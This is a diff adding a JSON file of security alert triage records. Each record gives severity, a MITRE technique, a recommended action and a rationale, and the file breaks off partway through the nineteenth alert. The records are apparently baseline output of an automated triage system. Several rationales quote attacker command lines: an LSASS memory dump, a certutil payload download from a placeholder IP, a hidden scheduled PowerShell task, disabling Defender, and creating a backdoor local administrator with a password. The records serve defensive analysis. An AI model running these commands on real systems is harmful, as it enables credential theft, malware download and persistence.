@@ -1,0 +1,1472 @@
+{
+  "base": {
+    "A-0001": {
+      "alert_id": "A-0001",
+      "severity": "high",
+      "confidence": 0.97,
+      "mitre_technique_id": "T1110",
+      "mitre_technique_name": "Brute Force",
+      "recommended_action": "contain",
+      "rationale": "412 failed SSH authentication attempts against root on internet-facing host web-prod-01 in 6 minutes (~1.1 req/sec) confirms automated brute-force activity. Source IP 203.0.113.45 is rated malicious (score 92/100) by threat intelligence, categorized as a known brute-force/ssh-scanner, and was seen in a prior alert just 1 hour earlier \u2014 indicating a persistent campaign. MITRE T1110 (Brute Force / Credential Access) is the best-fit technique. No successful login is confirmed in this alert, but the volume, source reputation, and targeting of root on a production server justify immediate containment: block the source IP at the perimeter firewall and audit SSH auth logs for any successful authentication.",
+      "supporting_observations": [
+        "IP 203.0.113.45 has a threat intelligence reputation score of 92/100 (malicious), categorized as brute-force and ssh-scanner.",
+        "412 failed SSH logins in 360 seconds (~1.1/sec) is consistent with automated credential stuffing or password spraying tooling.",
+        "Source IP was already flagged in a prior alert (HIST-ip-203.0.113.45) approximately 1 hour before this event, indicating a sustained campaign.",
+        "Attack targets the root account \u2014 the highest-privilege account on Linux systems \u2014 maximizing potential impact if successful.",
+        "Host web-prod-01 has no other recent alerts, suggesting no lateral movement has occurred yet, but the window for containment is open."
+      ]
+    },
+    "A-0002": {
+      "alert_id": "A-0002",
+      "severity": "critical",
+      "confidence": 0.97,
+      "mitre_technique_id": "T1110",
+      "mitre_technique_name": "Brute Force",
+      "recommended_action": "contain",
+      "rationale": "All evidence strongly supports a confirmed brute-force compromise of service account svc-billing on production host app-prod-07. The source IP (203.0.113.45) carries a threat score of 92/100, is categorized as a known brute-force/SSH scanner, and was already flagged in a prior alert just 2.5 hours earlier (HIST-ip-203.0.113.45 at 02:14Z). The attack pattern \u2014 233 consecutive authentication failures immediately followed by a success \u2014 is the definitive signature of a successful brute-force attack (T1110). The victim account (svc-billing) is a service account, for which an interactive external login is highly anomalous and has no prior alert history, ruling out authorized access. Immediate containment is warranted: block the source IP, disable/reset svc-billing credentials, isolate app-prod-07 for forensic review, and audit any actions taken under svc-billing post-authentication.",
+      "supporting_observations": [
+        "IP 203.0.113.45 rated malicious with risk score 92/100, categorized as brute-force and ssh-scanner (last seen 2026-05-28).",
+        "Prior alert HIST-ip-203.0.113.45 fired at 02:14Z \u2014 ~2.5 hours before this event \u2014 confirming a sustained campaign from this IP.",
+        "233 consecutive authentication failures immediately preceding a single success is the textbook brute-force compromise pattern.",
+        "Victim account svc-billing is a service account with zero prior alert history, making an external interactive login highly anomalous.",
+        "Target host app-prod-07 is a production system, elevating the potential blast radius of this compromise."
+      ]
+    },
+    "A-0003": {
+      "alert_id": "A-0003",
+      "severity": "critical",
+      "confidence": 0.95,
+      "mitre_technique_id": "T1059.001",
+      "mitre_technique_name": "PowerShell",
+      "recommended_action": "contain",
+      "rationale": "This alert presents a high-fidelity, multi-indicator malicious document execution chain. winword.exe spawned powershell.exe with -nop (no profile), -w hidden (hidden window), and -enc (base64-encoded command) \u2014 a textbook Living-off-the-Land (LotL) downloader pattern. The decoded command is described as a 'downloader stub', strongly suggesting a staged payload delivery (e.g., IEX cradle). MITRE mapping confirms T1059.001 (PowerShell, score 4) as the primary execution technique, with T1566.001 (Spearphishing Attachment) as the likely initial access vector given the Word parent process. Host FIN-WS-118 had a prior alert just 60 minutes before this event, suggesting the host may already be partially compromised or was targeted in a multi-stage attack. User m.reyes has no prior alert history, making this a first-time trigger \u2014 reducing the likelihood of a known-bad false positive. No IPs or hashes were available to enrich, but the behavioral chain alone (Office \u2192 hidden PowerShell \u2192 encoded downloader) is sufficient for high-confidence escalation. Immediate containment of FIN-WS-118 is recommended: isolate the host, revoke m.reyes session tokens, capture memory for forensic analysis, and escalate to IR team.",
+      "supporting_observations": [
+        "winword.exe spawned powershell.exe \u2014 Office application spawning a shell is a strong indicator of malicious macro or exploit execution.",
+        "PowerShell launched with -nop -w hidden -enc flags: no-profile, hidden window, and base64-encoded command \u2014 classic downloader/stager pattern.",
+        "Decoded command described as a 'downloader stub', indicating staged payload delivery (likely IEX/Invoke-Expression cradle).",
+        "MITRE T1059.001 (PowerShell) matched with score 4; T1566.001 (Spearphishing Attachment) matched as probable initial access vector.",
+        "FIN-WS-118 had a prior alert exactly 60 minutes before this event (HIST-host-FIN-WS-118, 2026-05-27T12:02:55Z), suggesting ongoing or multi-stage attack activity on this host.",
+        "User m.reyes has zero prior alerts in the last 168 hours \u2014 no history of authorized scripting or testing activity to suggest a false positive.",
+        "Process integrity level is 'medium', consistent with a user-context execution (not elevated), typical of initial-stage malware before privilege escalation."
+      ]
+    },
+    "A-0004": {
+      "alert_id": "A-0004",
+      "severity": "high",
+      "confidence": 0.87,
+      "mitre_technique_id": "T1078",
+      "mitre_technique_name": "Valid Accounts",
+      "recommended_action": "contain",
+      "rationale": "User a.kapoor authenticated from New York (198.51.100.23, unknown/clean) and Singapore (203.0.113.210) within 40 minutes \u2014 a geophysically impossible travel pattern. The Singapore IP is flagged as suspicious (score 58/100) and categorized as an anonymizer, consistent with an adversary masking their true location after credential compromise. The user has no prior alerts in the last 7 days, ruling out a known noisy account. The anonymizer classification significantly elevates the likelihood of malicious intent over a legitimate VPN use case. Immediate containment is recommended: suspend the a.kapoor session, force password reset, revoke active tokens, and initiate MFA re-enrollment. Escalate to identity/IR team for credential compromise investigation.",
+      "supporting_observations": [
+        "203.0.113.210 (Singapore) flagged as suspicious with score 58/100, categorized as anonymizer \u2014 last seen 2026-05-26",
+        "198.51.100.23 (New York) has unknown reputation with no prior alert history",
+        "40-minute gap between US-NY and SG logins is physically impossible (~10,000 miles apart)",
+        "User a.kapoor has zero prior alerts in the last 168 hours, making this anomalous rather than routine noise",
+        "MITRE T1078 (Valid Accounts) matched \u2014 adversary likely using stolen credentials behind anonymizing proxy"
+      ]
+    },
+    "A-0005": {
+      "alert_id": "A-0005",
+      "severity": "critical",
+      "confidence": 0.97,
+      "mitre_technique_id": "T1566.001",
+      "mitre_technique_name": "Spearphishing Attachment",
+      "recommended_action": "escalate",
+      "rationale": "Multiple high-confidence indicators confirm this is an active Emotet phishing campaign targeting the accounts-payable team: (1) The .xlsm attachment hash (SHA256: 9f1c2e7a4b8d6f0a3c5e9b1d7f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8a) is confirmed malware \u2014 family EmotetDoc, signature TrojanDownloader:O97M/Emotet, with 37 AV detections, first seen 2026-02-18. (2) The sender domain 'accounts-payable-support.com' is a classic look-alike targeting the AP team (ap.team@corp.example), a high-value BEC/fraud target. (3) SPF hard FAIL on the sender confirms domain spoofing/impersonation. (4) The email was delivered to 3 mailboxes, meaning potential exposure is active and immediate. (5) Emotet is a well-known initial access broker that drops secondary payloads (Cobalt Strike, ransomware). Immediate escalation is required: quarantine the emails from all 3 mailboxes, block the domain and hash at all controls, and determine whether any recipient opened the attachment.",
+      "supporting_observations": [
+        "Hash 9f1c2e7a4b8d6f0a3c5e9b1d7f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8a identified as EmotetDoc malware with 37 detections (TrojanDownloader:O97M/Emotet)",
+        "Sender domain 'accounts-payable-support.com' is a look-alike targeting the AP team \u2014 classic BEC/fraud lure",
+        "SPF result: FAIL \u2014 sender is not authorized to send on behalf of the impersonated domain",
+        "Email delivered to 3 mailboxes (ap.team@corp.example) \u2014 active exposure, not blocked at gateway",
+        "No prior alerts for this domain or user in the last 7 days \u2014 first-time delivery, no established baseline",
+        "MITRE ATT&CK: T1566.001 Spearphishing Attachment (Initial Access) \u2014 auto-executing macro in .xlsm is a textbook Emotet delivery vector"
+      ]
+    },
+    "A-0006": {
+      "alert_id": "A-0006",
+      "severity": "critical",
+      "confidence": 1.0,
+      "mitre_technique_id": "T1486",
+      "mitre_technique_name": "Data Encrypted for Impact",
+      "recommended_action": "escalate",
+      "rationale": "This is a confirmed, active ransomware incident with multiple high-confidence indicators: (1) The file hash (SHA256: 1a2b3c4d...f1a2b) is positively identified as known malware \u2014 family 'LockBitClone', with 61 detections and signatures including 'Ransom:Win32/LockBit' and 'Trojan.Ransom.Generic', first seen 2026-03-11. (2) The process 'svch0st.exe' is a deliberate typosquat of the legitimate Windows 'svchost.exe', a classic masquerading technique (T1036.005) used to evade detection. (3) 4,200 files were renamed to the '.locked' extension across the corporate file share FS-CORP-02, and a ransom note (READ_ME_RANSOM.txt) was dropped in every directory \u2014 textbook ransomware behavior consistent with T1486. (4) The attack occurred at 01:07 UTC, a low-activity window likely chosen to maximize encryption before detection. Immediate escalation and containment of FS-CORP-02 is required: isolate the host from the network, suspend the process, preserve forensic evidence, and initiate IR procedures including backup restoration assessment.",
+      "supporting_observations": [
+        "Hash 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b confirmed as LockBitClone ransomware with 61 AV detections (Ransom:Win32/LockBit, Trojan.Ransom.Generic)",
+        "Process name 'svch0st.exe' is a typosquat of legitimate 'svchost.exe' \u2014 masquerading technique to evade process-based detection",
+        "4,200 files renamed to .locked extension on corporate file share FS-CORP-02 \u2014 mass encryption event",
+        "Ransom note READ_ME_RANSOM.txt dropped in every affected directory \u2014 confirms ransomware payload delivery",
+        "Attack timestamp 01:07 UTC suggests deliberate off-hours execution to maximize damage before detection",
+        "No prior alerts on FS-CORP-02 or svch0st.exe in the last 7 days \u2014 this appears to be a first-strike, fast-moving infection"
+      ]
+    },
+    "A-0007": {
+      "alert_id": "A-0007",
+      "severity": "critical",
+      "confidence": 0.97,
+      "mitre_technique_id": "T1003.001",
+      "mitre_technique_name": "LSASS Memory",
+      "recommended_action": "contain",
+      "rationale": "All evidence converges on a confirmed, active credential dumping attack against a Domain Controller:\n\n1. **Tool & Command**: `procdump64.exe -ma lsass.exe c:\\temp\\out.dmp` is the canonical, textbook command for dumping LSASS memory. The `-ma` flag creates a full memory dump. The output is written to `c:\\temp\\`, a common staging directory for exfiltration.\n\n2. **Access Mask 0x1010**: Corresponds to PROCESS_VM_READ (0x0010) + PROCESS_QUERY_LIMITED_INFORMATION (0x1000) \u2014 exactly the permissions required to read LSASS memory and extract credentials (NTLM hashes, Kerberos tickets, plaintext passwords).\n\n3. **Target Asset \u2014 DC-01**: This is a Domain Controller, meaning LSASS holds credentials for every domain account. A successful dump here gives an attacker the keys to the entire Active Directory domain.\n\n4. **Executing Account \u2014 svc-backup**: A service account running procdump against LSASS is highly anomalous. Service accounts should never interact with LSASS directly. No prior alerts for this user suggest the account may have been compromised and is being abused for lateral movement or privilege escalation.\n\n5. **MITRE Mapping**: Perfect score match to T1003.001 (LSASS Memory) under Credential Access. MITRE tool mapping also confirms ProcDump is explicitly listed as a known tool for this technique.\n\n6. **Prior DC-01 Alert**: A prior alert on DC-01 ~1 hour before this event (21:11 vs 22:11) suggests this may be part of a broader, ongoing intrusion campaign.\n\n7. **No Benign Justification**: No authorized change window, no known red team activity, no legitimate reason for a backup service account to dump LSASS on a DC.\n\n**Immediate containment is required**: isolate DC-01, disable/reset svc-backup, rotate all domain credentials (krbtgt x2, all privileged accounts), and initiate IR procedures for potential domain compromise.",
+      "supporting_observations": [
+        "procdump64.exe -ma lsass.exe c:\\temp\\out.dmp \u2014 textbook LSASS full memory dump command",
+        "Access mask 0x1010 = PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION \u2014 exact permissions for credential extraction",
+        "Target is DC-01 (Domain Controller) \u2014 LSASS holds all domain credentials; full domain compromise possible",
+        "Executing user svc-backup is a service account with no prior alert history \u2014 likely compromised and abused",
+        "MITRE ATT&CK T1003.001 (LSASS Memory) matched with perfect score; ProcDump is an explicitly listed tool for this technique",
+        "Prior alert on DC-01 approximately 1 hour earlier (HIST-host-DC-01, 2026-05-28T21:11:09Z) suggests ongoing intrusion activity",
+        "Output written to c:\\temp\\ \u2014 a common staging directory used prior to exfiltration"
+      ]
+    },
+    "A-0008": {
+      "alert_id": "A-0008",
+      "severity": "high",
+      "confidence": 0.92,
+      "mitre_technique_id": "T1071.004",
+      "mitre_technique_name": "Application Layer Protocol: DNS",
+      "recommended_action": "contain",
+      "rationale": "All evidence strongly supports an active DNS tunneling / data exfiltration incident on MKT-WS-244:\n\n1. **Behavioral signature is unambiguous**: 5,120 TXT-type DNS queries in one hour to a single SLD (exfil-data.net) with an average subdomain label entropy of 4.7 bits \u2014 well above the ~3.5 threshold that distinguishes legitimate DNS from encoded/tunneled payloads. TXT records are the canonical carrier for DNS tunneling tools (iodine, dnscat2, etc.).\n\n2. **MITRE mapping \u2014 perfect match**: The activity maps with a score of 1.0 to T1071.004 (Application Layer Protocol: DNS), tactic: Command and Control. High-entropy TXT queries are also consistent with T1048.003 (Exfiltration Over Alternative Protocol: DNS).\n\n3. **Suspicious domain name**: The SLD \"exfil-data.net\" is semantically suspicious and has no prior alert history in the environment, suggesting a newly registered or purpose-built C2/exfil domain not previously seen by defenders.\n\n4. **Host has prior activity**: MKT-WS-244 generated an alert just one hour before this event (2026-05-27T17:33:50Z), indicating the host may have been compromised or exhibiting anomalous behavior prior to the DNS tunneling burst \u2014 consistent with a post-exploitation exfiltration phase.\n\n5. **No benign explanation**: No IPs, hashes, or processes were provided that could indicate an authorized tool (e.g., a DNS-based VPN or monitoring agent). The volume and entropy rule out legitimate DNS activity.\n\n**Recommended immediate actions**: (a) Isolate MKT-WS-244 from the network to stop ongoing exfiltration. (b) Block exfil-data.net and all subdomains at the DNS resolver and firewall. (c) Capture and preserve DNS logs and memory from the host. (d) Escalate to IR for full forensic investigation of the compromise chain.",
+      "supporting_observations": [
+        "5,120 TXT DNS queries to exfil-data.net in one hour \u2014 volume consistent with DNS tunneling tools",
+        "Average subdomain label entropy of 4.7 bits \u2014 significantly above the ~3.5 threshold for legitimate DNS, indicating encoded/randomized payloads",
+        "MITRE T1071.004 matched with perfect score (1.0) \u2014 DNS used as C2/exfil channel",
+        "Domain 'exfil-data.net' is semantically suspicious and has zero prior alert history in the environment (newly seen)",
+        "MKT-WS-244 had a prior alert exactly one hour before this event (HIST-host-MKT-WS-244, 2026-05-27T17:33:50Z), suggesting earlier compromise activity",
+        "No file hashes, processes, or IPs provided to suggest an authorized DNS-tunneling tool or VPN"
+      ]
+    },
+    "A-0009": {
+      "alert_id": "A-0009",
+      "severity": "critical",
+      "confidence": 0.95,
+      "mitre_technique_id": "T1105",
+      "mitre_technique_name": "Ingress Tool Transfer",
+      "recommended_action": "contain",
+      "rationale": "certutil.exe was used with -urlcache -split -f flags to download a.exe from 198.51.100.77, a confirmed malicious IP (TI score 88/100, category: malware-download, last seen today). This is a classic Living-Off-the-Land Binary (LOLBIN) abuse pattern mapped to T1105 (Ingress Tool Transfer). The host HR-WS-051 had a prior suspicious alert approximately 2 hours before this event, suggesting an active and progressing compromise. The combination of a known-malicious staging server, LOLBIN download technique, and same-day prior host activity on an HR workstation warrants immediate containment to prevent lateral movement or data exfiltration.",
+      "supporting_observations": [
+        "IP 198.51.100.77 has a TI reputation score of 88/100 (malicious), categorized as malware-download, last seen 2026-05-28.",
+        "Command line 'certutil.exe -urlcache -split -f http://198.51.100.77/a.exe a.exe' is a textbook LOLBIN abuse technique to bypass application controls.",
+        "HR-WS-051 had a prior alert at 09:36 UTC on the same day, ~2 hours before this event, indicating a possible ongoing compromise chain.",
+        "Downloaded file 'a.exe' is a generic name consistent with staged malware delivery.",
+        "MITRE ATT&CK T1105 (Ingress Tool Transfer) confirmed as best-fit technique via keyword mapping."
+      ]
+    },
+    "A-0010": {
+      "alert_id": "A-0010",
+      "severity": "high",
+      "confidence": 0.88,
+      "mitre_technique_id": "T1053.005",
+      "mitre_technique_name": "Scheduled Task",
+      "recommended_action": "investigate",
+      "rationale": "Multiple high-confidence indicators of malicious persistence activity converge on this alert:\n\n1. **Scheduled Task for Persistence (T1053.005):** schtasks.exe was used to create a task named \"Updater\" \u2014 a common masquerading name \u2014 triggering every 10 minutes, a hallmark of attacker-controlled beaconing or persistence mechanisms.\n\n2. **Hidden PowerShell Execution (T1059.001 / T1027):** The task launches `powershell -w hidden -f c:\\u.ps1`. The `-w hidden` flag suppresses the window to evade user detection, and the script path `c:\\u.ps1` is suspiciously short and non-descriptive, consistent with attacker-dropped payloads. MITRE mapping also flagged T1027 (Obfuscated Files or Information) for the defense evasion angle.\n\n3. **Prior Host Activity:** ENG-WS-309 had a prior alert just one hour before this event (19:05 vs 20:05 UTC), suggesting this host may already be under active compromise or reconnaissance.\n\n4. **No Prior User Alerts:** User t.osei has no alert history in the past 7 days, making this an anomalous first-time event for this account \u2014 either the account is newly compromised or being used for the first time in this manner.\n\n5. **No Benign Justification Found:** No IPs, hashes, or domains were present to corroborate a legitimate software deployment. The script `c:\\u.ps1` has no known alert history and is not associated with any recognized tooling.\n\n**Recommended Action:** Investigate immediately \u2014 retrieve and analyze `c:\\u.ps1`, review t.osei's recent logon activity and privilege level, examine the prior alert on ENG-WS-309, and determine whether lateral movement or C2 activity is underway. Consider isolating ENG-WS-309 if the script content is confirmed malicious.",
+      "supporting_observations": [
+        "MITRE top match: T1053.005 (Scheduled Task, score 2) \u2014 direct match to schtasks /create command",
+        "PowerShell launched with -w hidden flag to suppress window visibility (defense evasion)",
+        "Script path c:\\u.ps1 is anomalously short and non-descriptive, consistent with attacker-dropped payload",
+        "Task name 'Updater' is a common attacker masquerade name mimicking legitimate update processes",
+        "ENG-WS-309 had a prior alert 1 hour before this event (HIST-host-ENG-WS-309, 2026-05-26T19:05:41Z)",
+        "User t.osei has zero alert history in the past 7 days \u2014 anomalous first-time behavior",
+        "10-minute trigger interval is consistent with C2 beaconing or persistent script execution patterns"
+      ]
+    },
+    "A-0011": {
+      "alert_id": "A-0011",
+      "severity": "high",
+      "confidence": 0.92,
+      "mitre_technique_id": "T1046",
+      "mitre_technique_name": "Network Service Discovery",
+      "recommended_action": "contain",
+      "rationale": "SALES-WS-077 (10.20.4.88) connected to port 445 (SMB) across 1,800 distinct internal hosts within minutes \u2014 a volume and speed entirely inconsistent with legitimate user activity on a sales workstation. Port 445 is the primary vector for SMB-based worms (EternalBlue, WannaCry, NotPetya) and lateral movement tools. MITRE mapping returned a perfect match to T1046 (Network Service Discovery). The host also generated a prior alert on 2026-05-26, indicating a pattern of suspicious behavior. While the IP has no external TI reputation (expected for RFC-1918), the behavioral profile strongly indicates active compromise or worm propagation. Immediate network isolation of SALES-WS-077 is recommended to prevent further lateral spread, followed by forensic investigation of the endpoint.",
+      "supporting_observations": [
+        "1,800 distinct SMB (port 445) connection attempts in minutes from a sales workstation \u2014 far exceeds any legitimate use case.",
+        "MITRE T1046 (Network Service Discovery) matched with a perfect score of 1.0.",
+        "SALES-WS-077 had a prior alert on 2026-05-26T12:12:04Z, indicating a recurring pattern of suspicious activity.",
+        "Port 445 is the canonical target of SMB worms (EternalBlue, WannaCry, NotPetya) and lateral movement frameworks.",
+        "Source is a sales workstation, not an IT/admin asset \u2014 no legitimate reason to perform subnet-wide SMB scanning.",
+        "No prior IP-level alerts for 10.20.4.88 in the last 7 days, suggesting the scanning behavior is newly initiated post-infection."
+      ]
+    },
+    "A-0012": {
+      "alert_id": "A-0012",
+      "severity": "informational",
+      "confidence": 0.97,
+      "mitre_technique_id": "T1190",
+      "mitre_technique_name": "Exploit Public-Facing Application",
+      "recommended_action": "close_false_positive",
+      "rationale": "All Suricata exploit signatures originated from 10.10.0.5 (nessus-scanner-01), an internally approved Nessus scanner. The alert fired at 02:00:12Z on Sunday, squarely within the authorized scan window (Sun 02:00\u201304:00). The source IP is an RFC-1918 address with zero threat-intel hits (reputation: unknown, score 0) and no prior malicious alert history in the last 7 days. The raw metadata explicitly confirms source_is_known_scanner=true. IDS signature firing during a Nessus scan is expected behavior \u2014 the scanner emits probe traffic that resembles exploit patterns by design. No threat actor activity is indicated. Recommend closing as a false positive and tuning Suricata to suppress alerts from this scanner IP during its authorized window.",
+      "supporting_observations": [
+        "Source IP 10.10.0.5 is an internal RFC-1918 address with reputation 'unknown' and risk score 0 \u2014 no threat intel association.",
+        "Host nessus-scanner-01 has zero prior alerts in the last 7 days, consistent with a legitimate scanner.",
+        "Alert timestamp 02:00:12Z on Sunday falls precisely within the approved scan window (Sun 02:00\u201304:00).",
+        "Raw alert metadata explicitly flags source_is_known_scanner=true.",
+        "MITRE mapping to T1190 reflects the nature of scanner probe traffic, not actual exploitation."
+      ]
+    },
+    "A-0013": {
+      "alert_id": "A-0013",
+      "severity": "informational",
+      "confidence": 0.93,
+      "mitre_technique_id": "T1059.001",
+      "mitre_technique_name": "PowerShell",
+      "recommended_action": "close_false_positive",
+      "rationale": "Encoded PowerShell (-enc) was executed by adm.deploy on APP-PROD-03, which maps to T1059.001. However, all contextual indicators point to authorized activity: (1) the user is a domain admin with a deployment role, (2) execution occurred within an approved change window tied to open ticket CHG-44821, (3) no prior alerts exist for either the user or host in the past 168 hours, and (4) there are no associated malicious IPs, domains, or file hashes. The EDR alert fired on a legitimate detection rule for encoded PowerShell, but the business context fully exonerates this activity. Closing as a false positive; no further action required.",
+      "supporting_observations": [
+        "MITRE mapping: T1059.001 (PowerShell) \u2014 encoded -enc flag is a known attacker technique but also used legitimately in deployment scripts.",
+        "User adm.deploy: 0 prior alerts in the last 168 hours \u2014 no suspicious behavioral pattern.",
+        "Host APP-PROD-03: 0 prior alerts in the last 168 hours \u2014 no signs of compromise or repeated targeting.",
+        "Change ticket CHG-44821 is open and within_change_window=true \u2014 activity is pre-approved and expected.",
+        "No file hashes, IPs, or domains present \u2014 no malware or C2 indicators to investigate."
+      ]
+    },
+    "A-0014": {
+      "alert_id": "A-0014",
+      "severity": "critical",
+      "confidence": 0.92,
+      "mitre_technique_id": "T1078.004",
+      "mitre_technique_name": "Valid Accounts: Cloud Accounts",
+      "recommended_action": "escalate",
+      "rationale": "AWS root account (account: 1129-prod) performed a console login without MFA from IP 203.0.113.9, which is flagged as suspicious (TI score 47/100) and categorized as a cloud/VPS provider \u2014 consistent with attacker or anonymization infrastructure. This IP has no prior history in the environment (0 alerts in 168h), making it genuinely unfamiliar. Root usage is explicitly against policy, and the absence of MFA compounds the severity significantly. A prior root-related alert was recorded ~4 hours earlier (HIST-user-root, 02:14 UTC), suggesting possible ongoing unauthorized access. The combination of: (1) highest-privilege account, (2) no MFA, (3) suspicious novel VPS IP, (4) policy violation, and (5) corroborating prior root activity constitutes a critical incident requiring immediate escalation. Recommended immediate actions: revoke active root sessions, rotate root credentials, enable MFA enforcement, and audit all CloudTrail actions performed by root in the past 24 hours.",
+      "supporting_observations": [
+        "IP 203.0.113.9 rated suspicious by threat intelligence (score 47/100), categorized as cloud/VPS, last seen 2026-05-28",
+        "IP 203.0.113.9 has zero prior alerts in the last 168 hours \u2014 confirmed unfamiliar to the environment",
+        "Root user had a prior alert (HIST-user-root) approximately 4 hours before this event (02:14 UTC vs 06:12 UTC), suggesting repeat or ongoing activity",
+        "MFA was NOT used (mfa_used: false) \u2014 a critical policy violation for root console access",
+        "Root account usage is explicitly against organizational policy per alert description",
+        "MITRE T1078.004 (Valid Accounts: Cloud Accounts) \u2014 adversary may be leveraging compromised root credentials"
+      ]
+    },
+    "A-0015": {
+      "alert_id": "A-0015",
+      "severity": "critical",
+      "confidence": 0.92,
+      "mitre_technique_id": "T1048",
+      "mitre_technique_name": "Exfiltration Over Alternative Protocol",
+      "recommended_action": "escalate",
+      "rationale": "A high-confidence data exfiltration event is indicated by multiple converging signals: (1) IAM user 'datasci-batch' transferred 240 GB from the sensitive 'corp-pii-archive' S3 bucket to an external IP \u2014 80\u00d7 above the 3 GB baseline; (2) the destination IP 198.51.100.140 is rated suspicious (score 61/100) and categorized as bulletproof-hosting infrastructure, a common exfiltration receiver; (3) the activity occurred at 03:55 UTC, atypical for a batch processing account; (4) no prior alerts exist for either the user or the IP in the last 7 days, suggesting a novel or compromised-credential-driven exfiltration channel. The combination of anomalous volume, PII-sensitive bucket, and a bulletproof-hosting destination warrants immediate escalation, IAM credential revocation, and incident response engagement.",
+      "supporting_observations": [
+        "IP 198.51.100.140 flagged as suspicious with risk score 61/100, categorized as bulletproof-hosting (last seen 2026-05-29)",
+        "240 GB egress from corp-pii-archive vs. 3 GB baseline \u2014 80x anomaly",
+        "No prior alert history for iam:datasci-batch or 198.51.100.140 in the past 7 days \u2014 novel activity",
+        "Activity occurred at 03:55 UTC \u2014 off-hours for a batch data science account",
+        "MITRE best-fit: T1048 Exfiltration Over Alternative Protocol (Exfiltration tactic)"
+      ]
+    },
+    "A-0016": {
+      "alert_id": "A-0016",
+      "severity": "high",
+      "confidence": 0.93,
+      "mitre_technique_id": "T1562.001",
+      "mitre_technique_name": "Disable or Modify Tools",
+      "recommended_action": "contain",
+      "rationale": "The command 'powershell Set-MpPreference -DisableRealtimeMonitoring $true' is a well-known, unambiguous defense evasion technique (T1562.001) used to blind Microsoft Defender before deploying malware or ransomware. MITRE mapping returned maximum-confidence matches for both T1562.001 (Defense Evasion) and T1059.001 (PowerShell Execution). Critically, host ENG-WS-211 had a prior alert exactly 60 minutes before this event (13:09:27Z vs 14:09:27Z), strongly indicating an active multi-stage attack sequence. User d.fischer has no prior alert history in the last 7 days, ruling out a known administrative pattern. The alert description itself confirms 'other suspicious activity' followed this action. There are no indicators of an authorized change window or IT admin context. Immediate containment of ENG-WS-211 is warranted to prevent further compromise, with escalation to IR for forensic investigation of the full attack chain.",
+      "supporting_observations": [
+        "Command 'Set-MpPreference -DisableRealtimeMonitoring $true' executed via PowerShell \u2014 textbook T1562.001 defense evasion technique.",
+        "Host ENG-WS-211 had a prior alert at 13:09:27Z, exactly 60 minutes before this event, indicating a multi-stage attack sequence.",
+        "User d.fischer has zero prior alerts in the last 168 hours \u2014 this behavior is anomalous and not an established admin pattern.",
+        "Alert description explicitly states the AV disable occurred 'shortly before other suspicious activity', corroborating active threat progression.",
+        "MITRE mapping returned maximum scores for T1562.001 (Defense Evasion) and T1059.001 (PowerShell Execution), confirming technique alignment."
+      ]
+    },
+    "A-0017": {
+      "alert_id": "A-0017",
+      "severity": "high",
+      "confidence": 0.9,
+      "mitre_technique_id": "T1098",
+      "mitre_technique_name": "Account Manipulation",
+      "recommended_action": "contain",
+      "rationale": "A new local account 'helpdesk_svc' was created and immediately added to the Administrators group on LAB-WS-004 via 'net user' and 'net localgroup' commands, outside any IT provisioning process. This matches T1098 (Account Manipulation) for persistence. Multiple red flags elevate this to high severity: (1) creation occurred at 23:40 UTC off-hours with no change-window context; (2) the account name mimics a legitimate service account to evade detection; (3) a plaintext password was passed directly in the command line; (4) the host LAB-WS-004 had a prior alert just 60 minutes earlier, suggesting an active intrusion sequence; (5) no prior history for 'helpdesk_svc' confirms this is a newly created backdoor account. Immediate containment of LAB-WS-004 is recommended: isolate the host, disable and remove the rogue account, and investigate the precursor activity from 22:40 UTC to determine the initial access vector.",
+      "supporting_observations": [
+        "net user helpdesk_svc P@ssw0rd! /add followed by net localgroup Administrators helpdesk_svc /add \u2014 classic two-step local admin backdoor pattern",
+        "Account created outside IT provisioning at 23:40 UTC (off-hours)",
+        "Deceptive service-account-style name 'helpdesk_svc' designed to blend in with legitimate accounts",
+        "LAB-WS-004 had a prior alert 1 hour earlier (HIST-host-LAB-WS-004 at 22:40 UTC), indicating a possible active intrusion sequence",
+        "No prior alert history for user 'helpdesk_svc' \u2014 confirms this is a newly created rogue account",
+        "Hardcoded plaintext password in command line is consistent with attacker tradecraft rather than legitimate IT automation"
+      ]
+    },
+    "A-0018": {
+      "alert_id": "A-0018",
+      "severity": "high",
+      "confidence": 0.92,
+      "mitre_technique_id": "T1098",
+      "mitre_technique_name": "Account Manipulation",
+      "recommended_action": "escalate",
+      "rationale": "A standard user account (j.lambert) was added to Domain Admins on DC-02 with no associated change ticket, making this an unauthorized privilege escalation event. MITRE mapping confirms T1098 (Account Manipulation / Persistence). No prior alerts exist for j.lambert (checked 720-hour window) or DC-02 (168-hour window), ruling out a known repeat pattern but providing no exonerating baseline. Domain Admins membership grants unrestricted domain-wide control \u2014 the highest-impact privilege in an AD environment. The complete absence of a change ticket is a hard policy violation and a strong indicator of either a compromised account, insider threat, or rogue administrative action. Immediate escalation is warranted: the account should be reviewed, the Domain Admins membership reverted pending investigation, and j.lambert's recent activity audited for lateral movement or data access.",
+      "supporting_observations": [
+        "j.lambert added to Domain Admins on DC-02 at 2026-05-28T17:22:31Z with no change ticket (change_ticket: null)",
+        "MITRE ATT&CK mapping: T1098 Account Manipulation (Persistence), match score 1.0",
+        "No prior alerts for user j.lambert in the last 720 hours \u2014 no authorized baseline for this action",
+        "No prior alerts for host DC-02 in the last 168 hours",
+        "Domain Admins is the highest-privilege group in Active Directory \u2014 unauthorized membership is critical-risk",
+        "Standard account elevated without authorization matches adversarial persistence and privilege escalation TTPs"
+      ]
+    },
+    "A-0019": {
+      "alert_id": "A-0019",
+      "severity": "high",
+      "confidence": 0.95,
+      "mitre_technique_id": "T1496",
+      "mitre_technique_name": "Resource Hijacking",
+      "recommended_action": "contain",
